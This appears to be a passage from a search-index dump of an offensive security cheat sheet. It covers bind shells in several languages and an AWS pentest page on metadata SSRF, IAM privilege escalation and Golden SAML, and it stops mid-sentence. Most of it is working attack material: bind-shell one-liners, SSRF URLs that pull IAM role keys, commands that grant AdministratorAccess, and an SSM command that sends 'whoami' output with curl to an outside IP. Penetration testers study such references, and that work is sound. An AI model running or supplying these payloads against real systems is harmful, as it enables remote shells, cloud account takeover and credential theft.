SamratAshok Mittal Shadow Credentials - The Hacker Recipes","title":"References"},{"location":"Methodology%20and%20Resources/Bind%20Shell%20Cheatsheet/","text":"Bind Shell Summary Bind Shell Perl Python PHP Ruby Netcat Traditional Netcat OpenBsd Ncat Socat Powershell Perl perl -e 'use Socket;$p=51337;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));\\ bind(S,sockaddr_in($p, INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);\\ close C){open(STDIN,\">&C\");open(STDOUT,\">&C\");open(STDERR,\">&C\");exec(\"/bin/bash -i\");};' Python Single line : python -c 'exec(\"\"\"import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind((\"0.0.0.0\",51337));s1.listen(1);c,a=s1.accept();\\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())\"\"\")' Expanded version : import socket as s,subprocess as sp; s1 = s.socket(s.AF_INET, s.SOCK_STREAM); s1.setsockopt(s.SOL_SOCKET, s.SO_REUSEADDR, 1); s1.bind((\"0.0.0.0\", 51337)); s1.listen(1); c, a = s1.accept(); while True: d = c.recv(1024).decode(); p = sp.Popen(d, shell=True, stdout=sp.PIPE, stderr=sp.PIPE, stdin=sp.PIPE); c.sendall(p.stdout.read()+p.stderr.read()) PHP php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,\"0.0.0.0\",51337);\\ socket_listen($s,1);$cl=socket_accept($s);while(1){if(!socket_write($cl,\"$ \",2))exit;\\ $in=socket_read($cl,100);$cmd=popen(\"$in\",\"r\");while(!feof($cmd)){$m=fgetc($cmd);\\ socket_write($cl,$m,strlen($m));}}' Ruby ruby -rsocket -e 'f=TCPServer.new(51337);s=f.accept;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",s,s,s)' Netcat Traditional nc -nlvp 51337 -e /bin/bash Netcat OpenBsd rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 51337 >/tmp/f Socat user@attacker$ socat FILE:`tty`,raw,echo=0 TCP:target.com:12345 user@victim$ socat TCP-LISTEN:12345,reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane Powershell https://github.com/besimorhino/powercat # Victim (listen) . .\\powercat.ps1 powercat -l -p 7002 -ep # Connect from attacker . .\\powercat.ps1 powercat -c 127.0.0.1 -p 7002","title":"Bind Shell"},{"location":"Methodology%20and%20Resources/Bind%20Shell%20Cheatsheet/#bind-shell","text":"","title":"Bind Shell"},{"location":"Methodology%20and%20Resources/Bind%20Shell%20Cheatsheet/#summary","text":"Bind Shell Perl Python PHP Ruby Netcat Traditional Netcat OpenBsd Ncat Socat Powershell","title":"Summary"},{"location":"Methodology%20and%20Resources/Bind%20Shell%20Cheatsheet/#perl","text":"perl -e 'use Socket;$p=51337;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));\\ bind(S,sockaddr_in($p, INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);\\ close C){open(STDIN,\">&C\");open(STDOUT,\">&C\");open(STDERR,\">&C\");exec(\"/bin/bash -i\");};'","title":"Perl"},{"location":"Methodology%20and%20Resources/Bind%20Shell%20Cheatsheet/#python","text":"Single line : python -c 'exec(\"\"\"import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind((\"0.0.0.0\",51337));s1.listen(1);c,a=s1.accept();\\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())\"\"\")' Expanded version : import socket as s,subprocess as sp; s1 = s.socket(s.AF_INET, s.SOCK_STREAM); s1.setsockopt(s.SOL_SOCKET, s.SO_REUSEADDR, 1); s1.bind((\"0.0.0.0\", 51337)); s1.listen(1); c, a = s1.accept(); while True: d = c.recv(1024).decode(); p = sp.Popen(d, shell=True, stdout=sp.PIPE, stderr=sp.PIPE, stdin=sp.PIPE); c.sendall(p.stdout.read()+p.stderr.read())","title":"Python"},{"location":"Methodology%20and%20Resources/Bind%20Shell%20Cheatsheet/#php","text":"php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,\"0.0.0.0\",51337);\\ socket_listen($s,1);$cl=socket_accept($s);while(1){if(!socket_write($cl,\"$ \",2))exit;\\ $in=socket_read($cl,100);$cmd=popen(\"$in\",\"r\");while(!feof($cmd)){$m=fgetc($cmd);\\ socket_write($cl,$m,strlen($m));}}'","title":"PHP"},{"location":"Methodology%20and%20Resources/Bind%20Shell%20Cheatsheet/#ruby","text":"ruby -rsocket -e 'f=TCPServer.new(51337);s=f.accept;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",s,s,s)'","title":"Ruby"},{"location":"Methodology%20and%20Resources/Bind%20Shell%20Cheatsheet/#netcat-traditional","text":"nc -nlvp 51337 -e /bin/bash","title":"Netcat Traditional"},{"location":"Methodology%20and%20Resources/Bind%20Shell%20Cheatsheet/#netcat-openbsd","text":"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 51337 >/tmp/f","title":"Netcat OpenBsd"},{"location":"Methodology%20and%20Resources/Bind%20Shell%20Cheatsheet/#socat","text":"user@attacker$ socat FILE:`tty`,raw,echo=0 TCP:target.com:12345 user@victim$ socat TCP-LISTEN:12345,reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane","title":"Socat"},{"location":"Methodology%20and%20Resources/Bind%20Shell%20Cheatsheet/#powershell","text":"https://github.com/besimorhino/powercat # Victim (listen) . .\\powercat.ps1 powercat -l -p 7002 -ep # Connect from attacker . .\\powercat.ps1 powercat -c 127.0.0.1 -p 7002","title":"Powershell"},{"location":"Methodology%20and%20Resources/Cloud%20-%20AWS%20Pentest/","text":"AWS Amazon Web Services offers reliable, scalable, and inexpensive cloud computing services. Summary AWS Summary Training Tools AWS Patterns AWS - Metadata SSRF Method for Elastic Cloud Compute (EC2) Method for Container Service (Fargate) AWS API calls that return credentials AWS - Shadow Admin Admin equivalent permission AWS - Gaining AWS Console Access via API Keys AWS - Enumerate IAM permissions AWS - Mount EBS volume to EC2 Linux AWS - Copy EC2 using AMI Image AWS - Instance Connect - Push an SSH key to EC2 instance AWS - Lambda - Extract function's code AWS - SSM - Command execution AWS - Golden SAML Attack AWS - Shadow Copy attack Disable CloudTrail Cover tracks by obfuscating Cloudtrail logs and Guard Duty DynamoDB Security checks References Training Damn Vulnerable Cloud Application - https://medium.com/poka-techblog/privilege-escalation-in-the-cloud-from-ssrf-to-global-account-administrator-fd943cf5a2f6 SadCloud - https://github.com/nccgroup/sadcloud Flaws - http://flaws.cloud Cloudgoat - https://github.com/RhinoSecurityLabs/cloudgoat Tools SkyArk - Discover the most privileged users in the scanned AWS environment, including the AWS Shadow Admins Requires read-Only permissions over IAM service ```powershell $ git clone https://github.com/cyberark/SkyArk $ powershell -ExecutionPolicy Bypass -NoProfile PS C> Import-Module .\\SkyArk.ps1 -force PS C> Start-AWStealth or in the Cloud Console PS C> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cyberark/SkyArk/master/AWStealth/AWStealth.ps1') PS C> Scan-AWShadowAdmins ``` Pacu - Exploit configuration flaws within an AWS environment using an extensible collection of modules with a diverse feature-set Requires AWS Keys ```powershell $ git clone https://github.com/RhinoSecurityLabs/pacu $ bash install.sh $ python3 pacu.py set_keys/swap_keys ls run [--keyword-arguments] run --regions eu-west-1,us-west-1 https://github.com/RhinoSecurityLabs/pacu/wiki/Module-Details ``` Bucket Finder - Search for public buckets, list and download all files if directory indexing is enabled ```powershell wget https://digi.ninja/files/bucket_finder_1.1.tar.bz2 -O bucket_finder_1.1.tar.bz2 ./bucket_finder.rb my_words ./bucket_finder.rb --region ie my_words US Standard = http://s3.amazonaws.com Ireland = http://s3-eu-west-1.amazonaws.com Northern California = http://s3-us-west-1.amazonaws.com Singapore = http://s3-ap-southeast-1.amazonaws.com Tokyo = http://s3-ap-northeast-1.amazonaws.com ./bucket_finder.rb --download --region ie my_words ./bucket_finder.rb --log-file bucket.out my_words ``` Boto3 - Amazon Web Services (AWS) SDK for Python ```python import boto3 # Create an S3 client s3 = boto3.client('s3',aws_access_key_id='AKIAJQDP3RKREDACTED',aws_secret_access_key='igH8yFmmpMbnkcUaCqXJIRIozKVaREDACTED',region_name='us-west-1') try: result = s3.list_buckets() print(result) except Exception as e: print(e) ``` Prowler - AWS security best practices assessments, audits, incident response, continuous monitoring, hardening and forensics readiness It follows guidelines of the CIS Amazon Web Services Foundations Benchmark and DOZENS of additional checks including GDPR and HIPAA (+100). * Require: arn:aws:iam::aws:policy/SecurityAudit powershell $ pip install awscli ansi2html detect-secrets $ git clone https://github.com/toniblyx/prowler $ sudo apt install jq $ ./prowler -E check42,check43 $ ./prowler -p custom-profile -r us-east-1 -c check11 $ ./prowler -A 123456789012 -R ProwlerRole # sts assume-role Principal Mapper - A tool for quickly evaluating IAM permissions in AWS ```powershell https://github.com/nccgroup/PMapper pip install principalmapper pmapper graph --create pmapper visualize --filetype png pmapper analysis --output-type text Determine if PowerUser can escalate privileges pmapper query \"preset privesc user/PowerUser\" pmapper argquery --principal user/PowerUser --preset privesc Find all principals that can escalate privileges pmapper query \"preset privesc \" pmapper argquery --principal ' ' --preset privesc Find all principals that PowerUser can access pmapper query \"preset connected user/PowerUser \" pmapper argquery --principal user/PowerUser --resource ' ' --preset connected Find all principals that can access PowerUser pmapper query \"preset connected * user/PowerUser\" pmapper argquery --principal '*' --resource user/PowerUser --preset connected ``` ScoutSuite - Multi-Cloud Security Auditing Tool powershell $ git clone https://github.com/nccgroup/ScoutSuite $ python scout.py PROVIDER --help # The --session-token is optional and only used for temporary credentials (i.e. role assumption). $ python scout.py aws --access-keys --access-key-id <AKIAIOSFODNN7EXAMPLE> --secret-access-key <wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY> --session-token <token> $ python scout.py azure --cli s3_objects_check - Whitebox evaluation of effective S3 object permissions, to identify publicly accessible files powershell $ git clone https://github.com/nccgroup/s3_objects_check $ python3 -m venv env && source env/bin/activate $ pip install -r requirements.txt $ python s3-objects-check.py -h $ python s3-objects-check.py -p whitebox-profile -e blackbox-profile cloudsplaining - An AWS IAM Security Assessment tool that identifies violations of least privilege and generates a risk-prioritized report powershell $ pip3 install --user cloudsplaining $ cloudsplaining download --profile myawsprofile $ cloudsplaining scan --input-file default.json weirdAAL - AWS Attack Library powershell python3 weirdAAL.py -m ec2_describe_instances -t demo python3 weirdAAL.py -m lambda_get_account_settings -t demo python3 weirdAAL.py -m lambda_get_function -a 'MY_LAMBDA_FUNCTION','us-west-2' -t yolo cloudmapper - CloudMapper helps you analyze your Amazon Web Services (AWS) environments powershell git clone https://github.com/duo-labs/cloudmapper.git # sudo yum install autoconf automake libtool python3-devel.x86_64 python3-tkinter python-pip jq awscli # You may additionally need \"build-essential\" sudo apt-get install autoconf automake libtool python3.7-dev python3-tk jq awscli pipenv install --skip-lock pipenv shell report: Generate HTML report. Includes summary of the accounts and audit findings. iam_report: Generate HTML report for the IAM information of an account. audit: Check for potential misconfigurations. collect: Collect metadata about an account. find_admins: Look at IAM policies to identify admin users and roles, or principals with specific privileges dufflebag - Find secrets that are accidentally exposed via Amazon EBS\u2019s \u201cpublic\u201d mode AWS Patterns Service URL s3 https://{user_provided}.s3.amazonaws.com cloudfront https://{random_id}.cloudfront.net ec2 ec2-{ip-seperated}.compute-1.amazonaws.com es https://{user_provided}-{random_id}.{region}.es.amazonaws.com elb http://{user_provided}-{random_id}.{region}.elb.amazonaws.com:80/443 elbv2 https://{user_provided}-{random_id}.{region}.elb.amazonaws.com rds mysql://{user_provided}.{random_id}.{region}.rds.amazonaws.com:3306 rds postgres://{user_provided}.{random_id}.{region}.rds.amazonaws.com:5432 route 53 {user_provided} execute-api https://{random_id}.execute-api.{region}.amazonaws.com/{user_provided} cloudsearch https://doc-{user_provided}-{random_id}.{region}.cloudsearch.amazonaws.com transfer sftp://s-{random_id}.server.transfer.{region}.amazonaws.com iot mqtt://{random_id}.iot.{region}.amazonaws.com:8883 iot https://{random_id}.iot.{region}.amazonaws.com:8443 iot https://{random_id}.iot.{region}.amazonaws.com:443 mq https://b-{random_id}-{1,2}.mq.{region}.amazonaws.com:8162 mq ssl://b-{random_id}-{1,2}.mq.{region}.amazonaws.com:61617 kafka b-{1,2,3,4}.{user_provided}.{random_id}.c{1,2}.kafka.{region}.amazonaws.com kafka {user_provided}.{random_id}.c{1,2}.kafka.useast-1.amazonaws.com cloud9 https://{random_id}.vfs.cloud9.{region}.amazonaws.com mediastore https://{random_id}.data.mediastore.{region}.amazonaws.com kinesisvideo https://{random_id}.kinesisvideo.{region}.amazonaws.com mediaconvert https://{random_id}.mediaconvert.{region}.amazonaws.com mediapackage https://{random_id}.mediapackage.{region}.amazonaws.com/in/v1/{random_id}/channel AWS - Metadata SSRF AWS released additional security defences against the attack. :warning: Only working with IMDSv1. Enabling IMDSv2 : aws ec2 modify-instance-metadata-options --instance-id <INSTANCE-ID> --profile <AWS_PROFILE> --http-endpoint enabled --http-token required . In order to usr IMDSv2 you must provide a token. export TOKEN=`curl -X PUT -H \"X-aws-ec2-metadata-token-ttl-seconds: 21600\" \"http://169.254.169.254/latest/api/token\"` curl -H \"X-aws-ec2-metadata-token:$TOKEN\" -v \"http://169.254.169.254/latest/meta-data\" Method for Elastic Cloud Compute (EC2) Example : https://awesomeapp.com/forward?target=http://169.254.169.254/latest/meta-data/iam/security-credentials/Awesome-WAF-Role/ Access the IAM : https://awesomeapp.com/forward?target=http://169.254.169.254/latest/meta-data/ powershell ami-id ami-launch-index ami-manifest-path block-device-mapping/ events/ hostname iam/ identity-credentials/ instance-action instance-id Find the name of the role assigned to the instance : https://awesomeapp.com/forward?target=http://169.254.169.254/latest/meta-data/iam/security-credentials/ Extract the role's temporary keys : https://awesomeapp.com/forward?target=http://169.254.169.254/latest/meta-data/iam/security-credentials/Awesome-WAF-Role/ powershell { \"Code\" : \"Success\", \"LastUpdated\" : \"2019-07-31T23:08:10Z\", \"Type\" : \"AWS-HMAC\", \"AccessKeyId\" : \"ASIA54BL6PJR37YOEP67\", \"SecretAccessKey\" : \"OiAjgcjm1oi2xxxxxxxxOEXkhOMhCOtJMP2\", \"Token\" : \"AgoJb3JpZ2luX2VjEDU86Rcfd/34E4rtgk8iKuTqwrRfOppiMnv\", \"Expiration\" : \"2019-08-01T05:20:30Z\" } Method for Container Service (Fargate) Fetch the AWS_CONTAINER_CREDENTIALS_RELATIVE_URI variable from https://awesomeapp.com/download?file=/proc/self/environ powershell JAVA_ALPINE_VERSION=8.212.04-r0 HOSTNAME=bbb3c57a0ed3SHLVL=1PORT=8443HOME=/root AWS_CONTAINER_CREDENTIALS_RELATIVE_URI=/v2/credentials/d22070e0-5f22-4987-ae90-1cd9bec3f447 AWS_EXECUTION_ENV=AWS_ECS_FARGATEMVN_VER=3.3.9JAVA_VERSION=8u212AWS_DEFAULT_REGION=us-west-2 ECS_CONTAINER_METADATA_URI=http://169.254.170.2/v3/cb4f6285-48f2-4a51-a787-67dbe61c13ffPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/lib/jvm/java-1.8-openjdk/jre/bin:/usr/lib/jvm/java-1.8-openjdk/bin:/usr/lib/mvn:/usr/lib/mvn/binLANG=C.UTF-8AWS_REGION=us-west-2Tag=48111bbJAVA_HOME=/usr/lib/jvm/java-1.8-openjdk/jreM2=/usr/lib/mvn/binPWD=/appM2_HOME=/usr/lib/mvnLD_LIBRARY_PATH=/usr/lib/jvm/java-1.8-openjdk/jre/lib/amd64/server:/usr/lib/jvm/java-1.8-openjdk/jre/lib/amd64:/usr/lib/jvm/java-1.8-openjd Use the credential URL to dump the AccessKey and SecretKey : https://awesomeapp.com/forward?target=http://169.254.170.2/v2/credentials/d22070e0-5f22-4987-ae90-1cd9bec3f447 powershell { \"RoleArn\": \"arn:aws:iam::953574914659:role/awesome-waf-role\", \"AccessKeyId\": \"ASIA54BL6PJR2L75XHVS\", \"SecretAccessKey\": \"j72eTy+WHgIbO6zpe2DnfjEhbObuTBKcemfrIygt\", \"Token\": \"FQoGZXIvYXdzEMj//////////wEaDEQW+wwBtaoyqH5lNSLGBF3PnwnLYa3ggfKBtLMoWCEyYklw6YX85koqNwKMYrP6ymcjv4X2gF5enPi9/Dx6m/1TTFIwMzZ3tf4V3rWP3HDt1ea6oygzTrWLvfdp57sKj+2ccXI+WWPDZh3eJr4Wt4JkiiXrWANn7Bx3BUj9ZM11RXrKRCvhrxdrMLoewRkWmErNEOFgbaCaT8WeOkzqli4f+Q36ZerT2V+FJ4SWDX1CBsimnDAMAdTIRSLFxVBBwW8171OHiBOYAMK2np1xAW1d3UCcZcGKKZTjBee2zs5+Rf5Nfkoq+j7GQkmD2PwCeAf0RFETB5EVePNtlBWpzfOOVBtsTUTFewFfx5cyNsitD3C2N93WR59LX/rNxyncHGDUP/6UPlasOcfzAaG738OJQmWfQTR0qksHIc2qiPtkstnNndh76is+r+Jc4q3wOWu2U2UBi44Hj+OS2UTpMAwc/MshIiGsUOrBQdPqcLLdAxKpUNTdSQNLg5wv4f2OrOI8/sneV58yBRolBz8DZoH8wohtLXpueDt8jsVSVLznnMOOe/4ehHE2Nt+Fy+tjaY5FUi/Ijdd5IrIdIvWFHY1XcPopUFYrDqr0yuZvX1YddfIcfdbmxf274v69FuuywXTo7cXk1QTMYZWlD/dPI/k6KQeO446UrHT9BJxcJMpchAIVRpI7nVKkSDwku1joKUG7DOeycuAbhecVZG825TocL0ks2yXPnIdvckAaU9DZf+afIV3Nxv3TI4sSX1npBhb2f/8C31pv8VHyu2NiN5V6OOHzZijHsYXsBQ==\", \"Expiration\": \"2019-09-18T04:05:59Z\" } AWS API calls that return credentials chime:createapikey codepipeline:pollforjobs cognito-identity:getopenidtoken cognito-identity:getopenidtokenfordeveloperidentity cognito-identity:getcredentialsforidentity connect:getfederationtoken connect:getfederationtokens ecr:getauthorizationtoken gamelift:requestuploadcredentials iam:createaccesskey iam:createloginprofile iam:createservicespecificcredential iam:resetservicespecificcredential iam:updateaccesskey lightsail:getinstanceaccessdetails lightsail:getrelationaldatabasemasteruserpassword rds-db:connect redshift:getclustercredentials sso:getrolecredentials mediapackage:rotatechannelcredentials mediapackage:rotateingestendpointcredentials sts:assumerole sts:assumerolewithsaml sts:assumerolewithwebidentity sts:getfederationtoken sts:getsessiontoken AWS - Shadow Admin Admin equivalent permission AdministratorAccess powershell \"Action\": \"*\" \"Resource\": \"*\" ec2:AssociateIamInstanceProfile iam:CreateAccessKey iam:CreateAccessKey : create a new access key to another IAM admin account powershell aws iam create-access-key \u2013user-name target_user iam:CreateLoginProfile : add a new password-based login profile, set a new password for an entity and impersonate it powershell $ aws iam create-login-profile \u2013user-name target_user \u2013password '|[3rxYGGl3@`~68)O{,-$1B\u201dzKejZZ.X1;6T}<XT5isoE=LB2L^G@{uK>f;/CQQeXSo>}th)KZ7v?\\\\hq.#@dh49\u2033=fT;|,lyTKOLG7J[qH$LV5U<9`O~Z\u201d,jJ[iT-D^(' \u2013no-password-reset-required iam:UpdateLoginProfile : reset other IAM users\u2019 login passwords. powershell $ aws iam update-login-profile \u2013user-name target_user \u2013password '|[3rxYGGl3@`~68)O{,-$1B\u201dzKejZZ.X1;6T}<XT5isoE=LB2L^G@{uK>f;/CQQeXSo>}th)KZ7v?\\\\hq.#@dh49\u2033=fT;|,lyTKOLG7J[qH$LV5U<9`O~Z\u201d,jJ[iT-D^(' \u2013no-password-reset-required iam:AttachUserPolicy , iam:AttachGroupPolicy or iam:AttachRolePolicy : attach existing admin policy to any other entity he currently possesses powershell $ aws iam attach-user-policy \u2013user-name my_username \u2013policy-arn arn:aws:iam::aws:policy/AdministratorAccess $ aws iam attach-user-policy \u2013user-name my_username \u2013policy-arn arn:aws:iam::aws:policy/AdministratorAccess $ aws iam attach-role-policy \u2013role-name role_i_can_assume \u2013policy-arn arn:aws:iam::aws:policy/AdministratorAccess iam:PutUserPolicy , iam:PutGroupPolicy or iam:PutRolePolicy : added inline policy will allow the attacker to grant additional privileges to previously compromised entities. powershell $ aws iam put-user-policy \u2013user-name my_username \u2013policy-name my_inline_policy \u2013policy-document file://path/to/administrator/policy.json iam:CreatePolicy : add a stealthy admin policy iam:AddUserToGroup : add into the admin group of the organization. powershell $ aws iam add-user-to-group \u2013group-name target_group \u2013user-name my_username iam:UpdateAssumeRolePolicy + sts:AssumeRole : change the assuming permissions of a privileged role and then assume it with a non-privileged account. powershell $ aws iam update-assume-role-policy \u2013role-name role_i_can_assume \u2013policy-document file://path/to/assume/role/policy.json iam:CreatePolicyVersion & iam:SetDefaultPolicyVersion : change customer-managed policies and change a non-privileged entity to be a privileged one. powershell $ aws iam create-policy-version \u2013policy-arn target_policy_arn \u2013policy-document file://path/to/administrator/policy.json \u2013set-as-default $ aws iam set-default-policy-version \u2013policy-arn target_policy_arn \u2013version-id v2 lambda:UpdateFunctionCode : give an attacker access to the privileges associated with the Lambda service role that is attached to that function. powershell $ aws lambda update-function-code \u2013function-name target_function \u2013zip-file fileb://my/lambda/code/zipped.zip glue:UpdateDevEndpoint : give an attacker access to the privileges associated with the role attached to the specific Glue development endpoint. powershell $ aws glue \u2013endpoint-name target_endpoint \u2013public-key file://path/to/my/public/ssh/key.pub iam:PassRole + ec2:CreateInstanceProfile / ec2:AddRoleToInstanceProfile : an attacker could create a new privileged instance profile and attach it to a compromised EC2 instance that he possesses. iam:PassRole + ec2:RunInstance : give an attacker access to the set of permissions that the instance profile/role has, which again could range from no privilege escalation to full administrator access of the AWS account. powershell # add ssh key $ aws ec2 run-instances \u2013image-id ami-a4dc46db \u2013instance-type t2.micro \u2013iam-instance-profile Name=iam-full-access-ip \u2013key-name my_ssh_key \u2013security-group-ids sg-123456 # execute a reverse shell $ aws ec2 run-instances \u2013image-id ami-a4dc46db \u2013instance-type t2.micro \u2013iam-instance-profile Name=iam-full-access-ip \u2013user-data file://script/with/reverse/shell.sh iam:PassRole + lambda:CreateFunction + lambda:InvokeFunction : give a user access to the privileges associated with any Lambda service role that exists in the account. powershell $ aws lambda create-function \u2013function-name my_function \u2013runtime python3.6 \u2013role arn_of_lambda_role \u2013handler lambda_function.lambda_handler \u2013code file://my/python/code.py $ aws lambda invoke \u2013function-name my_function output.txt Example of code.py python import boto3 def lambda_handler(event, context): client = boto3.client('iam') response = client.attach_user_policy( UserName='my_username', PolicyArn=\"arn:aws:iam::aws:policy/AdministratorAccess\" ) return response iam:PassRole + glue:CreateDevEndpoint : access to the privileges associated with any Glue service role that exists in the account. powershell $ aws glue create-dev-endpoint \u2013endpoint-name my_dev_endpoint \u2013role-arn arn_of_glue_service_role \u2013public-key file://path/to/my/public/ssh/key.pub AWS - Gaining AWS Console Access via API Keys A utility to convert your AWS CLI credentials into AWS console access. $> git clone https://github.com/NetSPI/aws_consoler $> aws_consoler -v -a AKIA[REDACTED] -s [REDACTED] 2020-03-13 19:44:57,800 [aws_consoler.cli] INFO: Validating arguments... 2020-03-13 19:44:57,801 [aws_consoler.cli] INFO: Calling logic. 2020-03-13 19:44:57,820 [aws_consoler.logic] INFO: Boto3 session established. 2020-03-13 19:44:58,193 [aws_consoler.logic] WARNING: Creds still permanent, creating federated session. 2020-03-13 19:44:58,698 [aws_consoler.logic] INFO: New federated session established. 2020-03-13 19:44:59,153 [aws_consoler.logic] INFO: Session valid, attempting to federate as arn:aws:sts::123456789012:federated-user/aws_consoler. 2020-03-13 19:44:59,668 [aws_consoler.logic] INFO: URL generated! https://signin.aws.amazon.com/federation?Action=login&Issuer=consoler.local&Destination=https%3A%2F%2Fconsole.aws.amazon.com%2Fconsole%2Fhome%3Fregion%3Dus-east-1&SigninToken=[REDACTED AWS - Enumerate IAM permissions Enumerate the permissions associated with AWS credential set with enumerate-iam git clone git@github.com:andresriancho/enumerate-iam.git pip install -r requirements.txt ./enumerate-iam.py --access-key AKIA... --secret-key StF0q... 2019-05-10 15:57:58,447 - 21345 - [INFO] Starting permission enumeration for access-key-id \"AKIA...\" 2019-05-10 15:58:01,532 - 21345 - [INFO] Run for the hills, get_account_authorization_details worked! 2019-05-10 15:58:01,537 - 21345 - [INFO] -- { \"RoleDetailList\": [ { \"Tags\": [], \"AssumeRolePolicyDocument\": { \"Version\": \"2008-10-17\", \"Statement\": [ { ... 2019-05-10 15:58:26,709 - 21345 - [INFO] -- gamelift.list_builds() worked! 2019-05-10 15:58:26,850 - 21345 - [INFO] -- cloudformation.list_stack_sets() worked! 2019-05-10 15:58:26,982 - 21345 - [INFO] -- directconnect.describe_locations() worked! 2019-05-10 15:58:27,021 - 21345 - [INFO] -- gamelift.describe_matchmaking_rule_sets() worked! 2019-05-10 15:58:27,311 - 21345 - [INFO] -- sqs.list_queues() worked! AWS - Mount EBS volume to EC2 Linux :warning: EBS snapshots are block-level incremental, which means that every snapshot only copies the blocks (or areas) in the volume that had been changed since the last snapshot. To restore your data, you need to create a new EBS volume from one of your EBS snapshots. The new volume will be a duplicate of the initial EBS volume on which the snapshot was taken. Head over to EC2 \u2013> Volumes and create a new volume of your preferred size and type. Select the created volume, right click and select the \"attach volume\" option. Select the instance from the instance text box as shown below : attach ebs volume aws ec2 create-volume \u2013snapshot-id snapshot_id --availability-zone zone aws ec2 attach-volume \u2013-volume-id volume_id \u2013-instance-id instance_id --device device Now, login to your ec2 instance and list the available disks using the following command : lsblk Check if the volume has any data using the following command : sudo file -s /dev/xvdf Format the volume to ext4 filesystem using the following command : sudo mkfs -t ext4 /dev/xvdf Create a directory of your choice to mount our new ext4 volume. I am using the name \u201cnewvolume\u201d : sudo mkdir /newvolume Mount the volume to \"newvolume\" directory using the following command : sudo mount /dev/xvdf /newvolume/ cd into newvolume directory and check the disk space for confirming the volume mount : cd /newvolume; df -h . AWS - Copy EC2 using AMI Image First you need to extract data about the current instances and their AMI/security groups/subnet : aws ec2 describe-images --region eu-west-1 # create a new image for the instance-id $ aws ec2 create-image --instance-id i-0438b003d81cd7ec5 --name \"AWS Audit\" --description \"Export AMI\" --region eu-west-1 # add key to AWS $ aws ec2 import-key-pair --key-name \"AWS Audit\" --public-key-material file://~/.ssh/id_rsa.pub --region eu-west-1 # create ec2 using the previously created AMI, use the same security group and subnet to connect easily. $ aws ec2 run-instances --image-id ami-0b77e2d906b00202d --security-group-ids \"sg-6d0d7f01\" --subnet-id subnet-9eb001ea --count 1 --instance-type t2.micro --key-name \"AWS Audit\" --query \"Instances[0].InstanceId\" --region eu-west-1 # now you can check the instance aws ec2 describe-instances --instance-ids i-0546910a0c18725a1 # If needed : edit groups aws ec2 modify-instance-attribute --instance-id \"i-0546910a0c18725a1\" --groups \"sg-6d0d7f01\" --region eu-west-1 # be a good guy, clean our instance to avoid any useless cost aws ec2 stop-instances --instance-id \"i-0546910a0c18725a1\" --region eu-west-1 aws ec2 terminate-instances --instance-id \"i-0546910a0c18725a1\" --region eu-west-1 AWS - Instance Connect - Push an SSH key to EC2 instance # https://aws.amazon.com/fr/blogs/compute/new-using-amazon-ec2-instance-connect-for-ssh-access-to-your-ec2-instances/ $ aws ec2 describe-instances --profile uploadcreds --region eu-west-1 | jq \".[][].Instances | .[] | {InstanceId, KeyName, State}\" $ aws ec2-instance-connect send-ssh-public-key --region us-east-1 --instance-id INSTANCE --availability-zone us-east-1d --instance-os-user ubuntu --ssh-public-key file://shortkey.pub --profile uploadcreds AWS - Lambda - Extract function's code # https://blog.appsecco.com/getting-shell-and-data-access-in-aws-by-chaining-vulnerabilities-7630fa57c7ed $ aws lambda list-functions --profile uploadcreds $ aws lambda get-function --function-name \"LAMBDA-NAME-HERE-FROM-PREVIOUS-QUERY\" --query 'Code.Location' --profile uploadcreds $ wget -O lambda-function.zip url-from-previous-query --profile uploadcreds AWS - SSM - Command execution :warning: The ssm-user account is not removed from the system when SSM Agent is uninstalled. SSM Agent is preinstalled, by default, on the following Amazon Machine Images (AMIs): * Windows Server 2008-2012 R2 AMIs published in November 2016 or later * Windows Server 2016 and 2019 * Amazon Linux * Amazon Linux 2 * Ubuntu Server 16.04 * Ubuntu Server 18.04 * Amazon ECS-Optimized $ aws ssm describe-instance-information --profile stolencreds --region eu-west-1 $ aws ssm send-command --instance-ids \"INSTANCE-ID-HERE\" --document-name \"AWS-RunShellScript\" --comment \"IP Config\" --parameters commands=ifconfig --output text --query \"Command.CommandId\" --profile stolencreds $ aws ssm list-command-invocations --command-id \"COMMAND-ID-HERE\" --details --query \"CommandInvocations[].CommandPlugins[].{Status:Status,Output:Output}\" --profile stolencreds e.g: $ aws ssm send-command --instance-ids \"i-05b\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588adaa\" --document-name \"AWS-RunShellScript\" --comment \"whoami\" --parameters commands='curl 162.243.\u2588\u2588\u2588.\u2588\u2588\u2588:8080/`whoami`' --output text --region=us-east-1 AWS - Golden SAML Attack https://www.youtube.com/watch?v=5dj4vOqqGZw https://www.cyberark.com/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-cloud-apps/ Using the extracted information, the tool will generate a forged SAML token as an arbitrary user that can then be used to authenticate to Office 365 without knowledge of that user's password. This attack also bypasses any MFA requirements. Requirement: * Token-signing private key (export from personal store using 